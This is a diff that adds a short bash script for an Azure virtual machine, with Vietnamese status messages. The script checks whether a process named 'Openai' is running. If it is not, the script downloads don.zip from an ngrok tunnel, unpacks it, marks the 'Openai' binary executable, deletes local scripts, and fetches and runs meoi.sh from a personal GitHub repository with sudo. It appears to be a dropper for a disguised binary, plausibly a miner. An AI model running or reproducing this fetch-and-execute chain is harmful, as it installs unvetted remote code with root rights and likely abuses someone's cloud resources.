@@ -1,0 +1,34 @@
+#!/bin/bash
+
+set -x #echo on
+if [ -f /home/azureuser/Openai ]; then
+    if pgrep -x "Openai" > /dev/null
+then
+    echo "scrip dang chay roi , ke cmn di "
+    
+else
+
+echo "script da install , chay thoi "
+cd /home/azureuser/
+sudo rm start.sh
+sudo rm meoi.sh
+sudo chmod +x Openai
+sudo wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/meoi.sh
+bash meoi.sh
+
+fi
+exit
+fi
+
+
+
+cd /home/azureuser/
+sudo wget http://b529-20-197-103-154.ngrok.io/don.zip
+sudo unzip don.zip
+sudo chmod +x Openai
+sudo rm start.sh
+sudo rm meoi.sh
+sudo wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/meoi.sh
+bash meoi.sh
+
+exit 0
